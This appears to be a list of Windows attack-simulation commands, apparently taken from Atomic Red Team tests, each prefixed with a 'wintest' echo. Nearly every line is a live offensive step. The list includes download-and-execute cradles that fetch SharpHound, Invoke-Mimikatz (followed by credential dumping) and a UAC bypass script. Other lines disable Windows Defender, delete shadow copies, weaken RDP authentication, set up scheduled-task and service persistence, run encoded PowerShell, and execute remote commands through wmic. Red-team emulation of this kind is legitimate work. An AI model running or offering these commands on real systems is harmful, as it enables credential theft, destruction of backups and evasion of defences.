echo "wintest"; powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}');"
Iecho "wintest";EX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
echo "wintest";$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
echo "wintest";Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
echo "wintest";reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
echo "wintest";iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
echo "wintest";"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
echo "wintest";powershell -ExecutionPolicy Bypass -command "New-ItemProperty -Path 'HKLM:SOFTWAREPoliciesMicrosoftWindows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
echo "wintest";powershell -ExecutionPolicy Bypass -command "Set-MpPreference -DisableRealtimeMonitoring 1"
echo "wintest";powershell -ExecutionPolicy Bypass Uninstall-WindowsFeature -Name Windows-Defender
echo "wintest";vssadmin.exe delete shadows /all /quiet
echo "wintest";reg add "HKLMSystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0 /f
echo "wintest";netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
echo "wintest";net start MpsSvc
echo "wintest";reg add "HKLMSystemCurrentControlSetControlTerminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
echo "wintest";regsvr32.exe -s \SYSVOL\.dll
echo "wintest";schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
echo "wintest";schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
echo "wintest";$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
echo "wintest";IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
echo "wintest";Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
echo "wintest";Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "#{xml_path}"
echo "wintest";schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
echo "wintest";Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
echo "wintest";schtasks /Run /TN "EventViewerBypass"
echo "wintest";sc.exe create "test" binPath= "echo alma"
echo "wintest";Invoke-WebRequest "https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"
echo "wintest";sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
echo "wintest";wmic useraccount get /ALL /format:csv
echo "wintest";wmic process get caption,executablepath,commandline /format:csv
echo "wintest";wmic qfe get description,installedOn /format:csv
echo "wintest";wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
echo "wintest";wmic process call create "calc.exe"
echo "wintest";powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
echo "wintest";wmic /node:node#{node} process call create "rundll32.exe \"#{dll_to_execute}\" #{function_to_execute}"
echo "wintest";wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
